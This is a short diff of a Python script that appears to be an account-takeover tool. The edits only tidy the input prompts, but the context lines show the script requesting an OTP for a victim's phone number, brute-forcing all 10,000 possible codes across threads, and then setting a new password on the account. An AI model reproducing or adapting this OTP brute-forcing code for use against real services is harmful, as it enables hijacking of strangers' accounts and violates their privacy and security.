@@ -49,9 +49,9 @@ def showProgress(done,nowTrying):
     stdout.flush()
 
 choice = int(input("(1/2): "))
-phone = input("\033[93m PhoneNumber(example:88017********): \033[0m")
+phone = input("\033[93mPhoneNumber(example:88017********):\033[0m")
 if choice==1:
-    nickname = input("\033[93m Type nickname(case sensitive): \033[0m")
+    nickname = input("\033[93mType nickname(case sensitive):\033[0m")
     target = getRegNumber(phone,nickname)
     target.req_otp()
     def crack():
@@ -74,7 +74,7 @@ elif choice==2:
             target.tryOTP(otp)
             Done = 10000 - q.qsize()
             showProgress(Done,otp)
-    NewPassword = input("\033[93m Type a new password (atleast 6 charecters long):\033[0m")
+    NewPassword = input("\033[93mType a new password (atleast 6 charecters long):\033[0m")
     with TPE(max_workers=NumberOfThreads) as executor:
         executor.submit(crack)
     while target.wrongOTP:
